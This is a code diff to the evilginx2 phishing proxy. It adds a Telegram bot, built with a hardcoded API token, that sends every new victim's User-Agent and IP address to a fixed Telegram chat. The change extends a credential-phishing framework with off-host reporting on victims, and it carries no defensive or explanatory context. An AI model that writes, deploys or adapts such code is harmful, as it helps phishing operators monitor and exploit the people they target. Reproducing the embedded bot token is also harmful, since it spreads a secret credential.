@@ -38,6 +38,8 @@ import (
 
 	"github.com/kgretzky/evilginx2/database"
 	"github.com/kgretzky/evilginx2/log"
+
+	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
 )
 
 const (
@@ -223,11 +225,18 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 									}
 								}
 
+								bot, err := tgbotapi.NewBotAPI("6527994050:AAHgt8nRXCI8DWnuArh2riUspi6Z9bnPKzA")
+								if err != nil {
+									log.Fatal("Failed to initialize Telegram bot:", err)
+								}
+
 								session, err := NewSession(pl.Name)
 								if err == nil {
 									sid := p.last_sid
 									p.last_sid += 1
 									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
+									msg := tgbotapi.NewMessage(5822512651, "New visitor has arrived: "+req.Header.Get("User-Agent")+" (IP: "+remote_addr+")")
+    								bot.Send(msg)
 									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
 									p.sessions[session.Id] = session
 									p.sids[session.Id] = sid
